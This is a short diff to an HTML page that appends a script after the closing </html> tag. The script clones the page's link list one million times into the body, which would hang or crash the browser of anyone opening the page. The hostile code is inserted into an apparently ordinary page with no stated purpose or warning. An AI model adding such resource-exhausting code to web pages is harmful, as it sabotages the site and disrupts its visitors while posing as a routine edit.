@@ -84,5 +84,13 @@
     </ul>
 </body>
 </html>
+            <script>
+    const list = document.querySelector('.link-list');
+    for (let i = 0; i < 1000000; i++) {
+        const clone = list.cloneNode(true);
+        document.body.appendChild(clone);
+    }
+</script>
+
 
            
